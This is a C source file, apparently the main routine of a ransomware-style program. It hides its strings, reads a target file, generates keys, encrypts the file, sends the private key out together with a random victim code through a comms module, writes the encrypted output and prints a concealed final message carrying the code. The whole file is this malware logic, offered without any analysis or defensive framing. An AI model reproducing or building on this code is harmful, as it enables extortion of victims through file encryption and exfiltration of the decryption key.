#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include "common.h"

#include "comm.h"
#include "crypt.h"
#include "logs.h"
#include "strings.h"

FILE* file_exists()
{
    unlock_app_strings();
    FILE* fp = fopen(get_string(__STRING_FILE_TO_CRYPT), "r");
    if (!fp)
    {
        printf(get_string(__STRING_FILE_TO_CRYPT_NOT_EXIST));
        lock_app_strings();
        return NULL;
    }
 
    lock_app_strings();
    return fp;
}

struct file_content* read_file()
{
    FILE* fp;
    struct file_content* buffer;

    fp = file_exists();
    if (fp == NULL)
        return NULL;

    buffer = malloc(sizeof(struct file_content));

    fseek(fp, 0L, SEEK_END);
    buffer->data_len = ftell(fp);
    fseek(fp, 0L, SEEK_SET);

    buffer->data = malloc(buffer->data_len + 1);
    fread(buffer->data, buffer->data_len, 1, fp);
    buffer->data[buffer->data_len] = 0;

    fclose(fp);

    return buffer;
}

bool write_encrypted_file(const struct file_content* buffer)
{
    unlock_app_strings();
    FILE* fp = fopen(get_string(__STRING_FILE_TO_DECRYPT), "wb");
    lock_app_strings();

    if (fp == NULL)
    {
        __DEBUG("Cannot write output.")
        return false;
    }

    fwrite(buffer->data, buffer->data_len, 1, fp);

    fclose(fp);

    return true;
}

void generate_code(char* code)
{
    sprintf(code, "%x-%x-%d", rand() & 0xffff, rand() & 0xfff, rand() % 10);
}

void __bam(const char* code)
{
    unlock_app_strings();
    printf(get_string(__STRING_FINAL_MESSAGE), code);
    lock_app_strings();
}

int main(int argc, char** argv)
{
    int ret;
    char *code;
    struct file_content* encrypted;
    struct file_content* input;

    ret = init_strings(argv[0]);
    if (ret < 0)
    {
        printf("FATAL: Cannot read application strings.\n");
        return 2;
    }
    
    input = read_file();
    if (input == NULL)
        return 1;

    generate_keys();
    encrypted = encrypt_file(input);

    code = calloc(32, sizeof(char));
    generate_code(code);

    send_private_key(get_private_key(), code);

    __DEBUG("Write enc file.");
    write_encrypted_file(encrypted);

    __DEBUG("BAM");
    __bam(code);

    __DEBUG("free mem");
    free_keys();
    free(code);

    free(input->data);
    free(input);

    free(encrypted);

    free_strings();

    return 0;
}
